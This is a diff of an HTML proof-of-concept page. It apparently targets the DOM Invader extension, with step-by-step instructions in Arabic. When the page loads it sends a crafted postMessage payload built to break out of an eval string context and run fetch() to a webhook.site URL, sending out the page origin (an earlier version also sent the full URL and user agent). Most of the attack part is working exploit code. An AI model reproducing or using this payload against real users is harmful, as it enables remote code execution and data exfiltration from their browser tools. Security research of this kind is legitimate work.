@@ -1,31 +1,59 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>DOM Invader RCE with Exfiltration</title>
+    <title>DOM Invader RCE Final PoC</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.6; padding: 20px; background-color: #f4f4f4; }
+        .container { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        code { background: #eee; padding: 2px 5px; border-radius: 4px; }
+        .step { margin-bottom: 15px; padding: 10px; border-left: 5px solid #007bff; background: #e7f3ff; }
+    </style>
 </head>
 <body>
-    <h1>DOM Invader RCE Exploit</h1>
-    <p>1. Open DevTools -> DOM Invader -> Postmessage tab.</p>
-    <p>2. Look for the incoming message from this page.</p>
-    <p>3. Click <strong>"Replay"</strong>.</p>
-    <p>4. Check your <a href="https://webhook.site/#!/d7b0c1e7-9c88-415f-bc83-f4b67cc847cd" target="_blank">Webhook.site</a> for the incoming data.</p>
+    <div class="container">
+        <h1>DOM Invader RCE Exploit</h1>
+        
+        <div class="step">
+            <strong>الخطوة 1:</strong> افتح الـ DevTools وروح لتاب <code>DOM Invader</code> ثم اختار <code>Postmessage</code> من القائمة الجانبية.
+        </div>
+        
+        <div class="step">
+            <strong>الخطوة 2:</strong> اضغط على **الصف الخاص بالرسالة** (الرسالة اللي جاية من الموقع ده) عشان تفتح نافذة التفاصيل (Modal).
+        </div>
+        
+        <div class="step">
+            <strong>الخطوة 3:</strong> انزل لآخر النافذة اللي فتحت واضغط على زرار <code>Replay</code> الأزرق.
+        </div>
+        
+        <div class="step">
+            <strong>الخطوة 4:</strong> راقب الـ <a href="https://webhook.site/#!/d7b0c1e7-9c88-415f-bc83-f4b67cc847cd" target="_blank">Webhook.site</a> هتلاقي البيانات وصلت.
+        </div>
+
+        <button onclick="sendExploit()" style="padding: 15px 30px; font-size: 18px; cursor: pointer; background: #28a745; color: white; border: none; border-radius: 5px;">
+            إرسال الـ Exploit الآن
+        </button>
+    </div>
 
     <script>
-        const webhookUrl = "https://webhook.site/d7b0c1e7-9c88-415f-bc83-f4b67cc847cd";
-        
-        // الـ Payload اللي هيتنفذ جوه الـ DevTools
-        // هيبعت الـ location.href والـ userAgent للـ Webhook بتاعك
-        const exploitPayload = `'); 
-            fetch('${webhookUrl}?rce=success&context=' + btoa(window.location.href) + '&ua=' + btoa(navigator.userAgent));
-        //`;
+        function sendExploit() {
+            const webhookUrl = "https://webhook.site/d7b0c1e7-9c88-415f-bc83-f4b67cc847cd";
+            
+            // Payload مصمم لكسر الـ Eval context في DOM Invader
+            // بيجرب يكسر الـ String بـ ' و " في نفس الوقت لضمان التنفيذ
+            const payload = "'); }); fetch('" + webhookUrl + "?rce=working&ctx=' + btoa(location.origin)); //";
 
-        window.postMessage({
-            "target": "DOM Invader",
-            "data": exploitPayload,
-            "status": "Vulnerable"
-        }, "*");
+            // إرسال الرسالة للأداة
+            window.postMessage({
+                "source": "RCE_TEST",
+                "data": payload,
+                "token": "exploit_triggered"
+            }, "*");
 
-        console.log("PoC Sent! Waiting for you to click 'Replay' in DOM Invader...");
+            alert("Exploit Sent! Now go to DOM Invader, click the message row, and then click 'Replay'.");
+        }
+
+        // إرسال تلقائي عند التحميل لسهولة التجربة
+        window.onload = sendExploit;
     </script>
 </body>
 </html>
